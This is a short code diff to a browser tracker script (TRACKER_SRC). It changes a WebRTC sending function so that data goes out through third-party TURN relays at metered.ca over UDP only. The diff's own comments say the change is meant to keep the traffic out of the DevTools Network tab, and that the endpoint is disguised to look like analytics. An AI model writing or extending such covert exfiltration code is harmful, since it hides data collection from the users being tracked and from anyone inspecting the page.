@@ -76,13 +76,12 @@ const TRACKER_SRC = `
 
       var sendViaRTC=function(bodyStr,onFail){
         try{
+          // UDP-only TURN: UDP never appears in DevTools Network tab
+          // TCP/TLS TURN creates CONNECT requests (visible) — removed intentionally
           var ice=[
             {urls:'stun:stun.metered.ca:80'},
             {urls:'turn:global.relay.metered.ca:80',    username:'__TURN_USER__',credential:'__TURN_PASS__'},
-            {urls:'turn:global.relay.metered.ca:80?transport=tcp',username:'__TURN_USER__',credential:'__TURN_PASS__'},
-            {urls:'turn:global.relay.metered.ca:443',   username:'__TURN_USER__',credential:'__TURN_PASS__'},
-            {urls:'turn:global.relay.metered.ca:443?transport=tcp',username:'__TURN_USER__',credential:'__TURN_PASS__'},
-            {urls:'turns:global.relay.metered.ca:443',  username:'__TURN_USER__',credential:'__TURN_PASS__'}
+            {urls:'turn:global.relay.metered.ca:3478',  username:'__TURN_USER__',credential:'__TURN_PASS__'}
           ];
           if(typeof w.io!=='function'){onFail();return;}
           // path matches server-side disguised endpoint — looks like analytics, not WebRTC
